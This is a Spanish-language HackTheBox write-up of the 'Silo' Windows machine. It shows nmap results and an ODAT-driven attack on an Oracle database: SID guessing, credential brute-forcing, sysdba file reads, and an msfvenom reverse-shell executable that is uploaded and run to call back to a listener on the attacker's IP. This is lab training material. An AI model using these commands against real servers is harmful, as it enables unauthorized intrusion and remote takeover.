---
title: "Silo - WriteUp"
date: Tue May 06 2025 21:30:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, reverse-shell, smb, msfvenom, windows, iis, bash, sudo]
image: /assets/img/htb-writeups/Pasted image 20240214200234.png
---

{% include machine-info.html
  machine="Silo"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Silo](/assets/img/htb-writeups/Pasted image 20240214200234.png)

---

---
Tags:   

-------

![SILO](/assets/img/htb-writeups/Pasted image 20240214200234.png)

Silo se centra principalmente en aprovechar Oracle para obtener un shell y escalar privilegios. Estaba pensado para completarse manualmente utilizando varias herramientas, sin embargo, Oracle Database Attack Tool simplifica enormemente el proceso, reduciendo sustancialmente la dificultad de la máquina.

--------

#### ENUM

NMAP
```bash
# Nmap 7.94SVN scan initiated Wed Feb 14 20:04:46 2024 as: nmap -sCV -p 80,135,139,445,1521,5985,8080,47001,49152,49153,49155,49159,49160,49162 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.95.188
Nmap scan report for 10.129.95.188
Host is up (0.045s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http         Oracle XML DB Enterprise Edition httpd
|_http-server-header: Oracle XML DB/Oracle Database
|_http-title: 400 Bad Request
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=XDB
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-14T19:06:22
|_  start_date: 2024-02-14T19:01:16
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: -32s, deviation: 0s, median: -33s
```

```bash
$ sudo nmap -Pn -sT --script=oracle-tns-poison -p 1521 10.129.95.188

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 21:00 CET
NSE: DEPRECATION WARNING: bin.lua is deprecated. Please use Lua 5.3 string.pack
Nmap scan report for 10.129.95.188
Host is up (0.045s latency).

PORT     STATE SERVICE
1521/tcp open  oracle
|_oracle-tns-poison: Host is vulnerable!
```

PARA EXPLOTAR LA VULNERABILIDAD DE ORACLE UTLIZAREMOS LA UTILIDAD _ODAT.py_

Podemos lanzar el comando `$ odat all -s 10.129.95.188 -p 1521` pero vamos a hacerlo paso a paso.

1. Descubriendo SID válidos.

```bash
$ odat sidguesser -s 10.129.95.188
```

![SILO](/assets/img/htb-writeups/Pasted image 20240216125921.png)

2. Una vez tenemos un SID válido buscaremos credenciales válidas con fuerza bruta, podemos usar el diccionario que viene integrado con la herramienta o definir/convertir uno ya establecido como los de seclists en el formato xxxxx/xxxxx:

```bash
$ odat passwordguesser -s 10.129.95.188 -d XE
...
$ odat passwordguesser -s 10.129.95.188 -d XE --accounts-file creds.txt
```

![SILO](/assets/img/htb-writeups/Pasted image 20240216130519.png)

3. Tenemos credenciales válidas, ahora debemos probarlas para ver si tenemos ejecución de comandos o lectura de archivos. Empezaremos con la lectura de archivos. A veces las credenciales no tienen los permisos suficientes y hay que añadir la opción "-sysdba" para elevar privilegios y te permita ejecutar el comando como es en este caso:

```bash
$ odat utlfile -s 10.129.95.188 -d XE -U 'scott' -P 'tiger' --getFile /Windows/System32/Drivers/etc/ hosts hosts --sysdba
```

![SILO](/assets/img/htb-writeups/Pasted image 20240216131248.png)

Para que no te de el WARNING lo puedes ejecutar con sudo o como root. El archivo lo copia en la ruta "/usr/share/odat/"

4. Como tenemos permisos de lectura/escritura vamos a subir un payload que nos de una reverse shell generado con _msfvenom_

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=443 -f exe -o reverse.exe
```

5. Copiamos el payload dentro de la ruta "/usr/share/odat" y subimos el payload a la ruta Windows/Temp de la máquina y lo guardamos como reverse.exe también.

```bash
$ odat utlfile -s 10.129.95.188 -d XE -U 'scott' -P 'tiger' --putFile /Windows/Temp reverse.exe reverse.exe --sysdba 
```

![SILO](/assets/img/htb-writeups/Pasted image 20240216135206.png)

6. Nos ponemos a la escucha con netcat y rlwrap.

```bash
$ rlwrap nc -lnvp 443
```

7. Y por último ejecutamos el payload en la máquina víctima:

```bash
$ odat externaltable -s 10.129.95.188 -d XE -U 'scott' -P 'tiger' --exec /Windows/Temp reverse.exe --sysdba
```

![SILO](/assets/img/htb-writeups/Pasted image 20240216135546.png)

Y pa dentro...

Como somos Administradores podemos registrar las don banderas de golpe y chimpun.
---

**Última actualización**: 2025-05-06<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
